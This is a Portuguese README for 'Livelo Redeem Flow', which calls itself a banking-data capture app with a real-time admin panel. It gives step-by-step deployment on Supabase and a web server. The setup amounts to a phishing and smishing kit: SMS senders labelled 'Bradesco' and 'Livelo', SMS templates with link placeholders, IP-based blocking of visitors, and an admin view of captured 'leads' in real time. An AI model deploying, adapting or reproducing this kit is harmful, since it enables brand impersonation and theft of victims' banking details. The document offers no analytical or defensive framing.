# Livelo Redeem Flow

SPA de captura de dados bancarios com painel administrativo em tempo real.

## Stack

- React + Vite + TypeScript + Tailwind CSS
- Supabase (PostgreSQL, Edge Functions, Realtime)
- Apache / nginx

---

## Passo a passo — Deploy completo

### 1. Clonar e instalar

```bash
git clone <repo>
cd livelo-redeem-flow
bun install
```

### 2. Configurar `.env`

```bash
cp .env.example .env
nano .env
```

Preencher as variaveis `VITE_*` (ver tabela abaixo).

### 3. Login no Supabase CLI

```bash
npx supabase login
```

Abre o navegador para autenticar. Depois de logar, linke o projeto:

```bash
npx supabase link --project-ref <project-id>
```

> O `project-id` e o **Reference ID** do projeto — encontra em **Settings > General** no Dashboard.

### 4. Aplicar migrations

```bash
npx supabase db push
```

Isso aplica todas as migrations pendentes de `supabase/migrations/` no banco remoto, em ordem.

> Se preferir aplicar manualmente, copie cada arquivo SQL para o **SQL Editor** no Dashboard, na ordem cronologica dos nomes.

### 5. Configurar Supabase Secrets

```bash
npx supabase secrets set SUPABASE_SERVICE_ROLE_KEY="..."
npx supabase secrets set TURNSTILE_SECRET_KEY="..."
npx supabase secrets set RISENEW_API_KEY="..."
npx supabase secrets set RISENEW_API_SECRET="..."
npx supabase secrets set RISENEW_SENDER="Bradesco"
npx supabase secrets set RISENEW_API_KEY_2="..."
npx supabase secrets set RISENEW_API_SECRET_2="..."
npx supabase secrets set RISENEW_SENDER_2="Livelo"
npx supabase secrets set IPINFO_TOKEN="..."
npx supabase secrets set ZENROWS_API_KEY="..."
npx supabase secrets set META_PIXEL_ID="..."
npx supabase secrets set META_CAPI_ACCESS_TOKEN="..."
```

> Tambem pode configurar pelo **Dashboard > Settings > Edge Functions > Secrets**.

Para verificar os secrets configurados:

```bash
npx supabase secrets list
```

### 6. Deploy das Edge Functions

```bash
npx supabase functions deploy
```

Faz deploy de todas as functions em `supabase/functions/`.

### 7. Criar usuario admin

**Dashboard > Authentication > Users > Add user**
- Email: mesmo valor de `VITE_ADMIN_EMAIL` no `.env`
- Marque **Auto Confirm User**

Depois no **SQL Editor**:

```sql
INSERT INTO public.user_roles (user_id, role)
SELECT id, 'admin' FROM auth.users
WHERE email = 'seu-email@aqui'
ON CONFLICT (user_id) DO NOTHING;
```

### 8. Build e deploy

```bash
bun run build
```

Copie o conteudo de `dist/` para o servidor web (Apache, nginx, etc).

---

## Atualizacao

```bash
git pull
bun install
bun run build
# copiar dist/ para o servidor
```

---

## Painel Admin

Acesse `/admin` — login com o usuario criado no Supabase Auth.

| Pagina | Descricao |
|---|---|
| `/admin` | Leads em tempo real, metricas, envio de SMS manual |
| `/admin/acessos` | Sessoes, IPs, status de bloqueio por regra |
| `/admin/controle` | Configuracoes gerais, templates SMS, fluxo de etapas |
| `/admin/fluxo` | Reordenacao e habilitacao de etapas |

---

## Variaveis de ambiente (`.env`)

| Variavel | Descricao |
|---|---|
| `VITE_SUPABASE_PROJECT_ID` | Project Reference ID |
| `VITE_SUPABASE_PUBLISHABLE_KEY` | Anon/public key |
| `VITE_SUPABASE_URL` | URL do projeto |
| `VITE_ADMIN_EMAIL` | Email do usuario admin |
| `VITE_TURNSTILE_SITE_KEY` | Site key publica do Turnstile (opcional) |
| `VITE_META_PIXEL_ID` | ID do pixel Meta (opcional) |
| `VITE_SMS_SENDER_1_LABEL` | Label do sender padrao no painel |
| `VITE_SMS_SENDER_2_LABEL` | Label do sender alternativo no painel |
| `VITE_SMS_LINK` | Placeholder `{{link}}` nos templates SMS |

## Supabase Secrets (edge functions)

| Secret | Descricao |
|---|---|
| `SUPABASE_SERVICE_ROLE_KEY` | Service role key (bypasses RLS) |
| `TURNSTILE_SECRET_KEY` | Cloudflare Turnstile secret |
| `RISENEW_API_KEY` | Risenew — sender padrao |
| `RISENEW_API_SECRET` | Risenew — sender padrao |
| `RISENEW_SENDER` | Nome do sender padrao |
| `RISENEW_API_KEY_2` | Risenew — sender alternativo |
| `RISENEW_API_SECRET_2` | Risenew — sender alternativo |
| `RISENEW_SENDER_2` | Nome do sender alternativo |
| `IPINFO_TOKEN` | IPInfo — geolocalizacao |
| `ZENROWS_API_KEY` | ZenRows — consulta de segmento |
| `META_PIXEL_ID` | ID do pixel Meta (edge function) |
| `META_CAPI_ACCESS_TOKEN` | Meta Conversions API token |

---

## Comandos uteis do Supabase CLI

```bash
npx supabase login              # autenticar
npx supabase link --project-ref # linkar projeto
npx supabase db push            # aplicar migrations
npx supabase secrets set K=V    # definir secret
npx supabase secrets list       # listar secrets
npx supabase functions deploy   # deploy edge functions
npx supabase functions serve    # rodar functions local
```
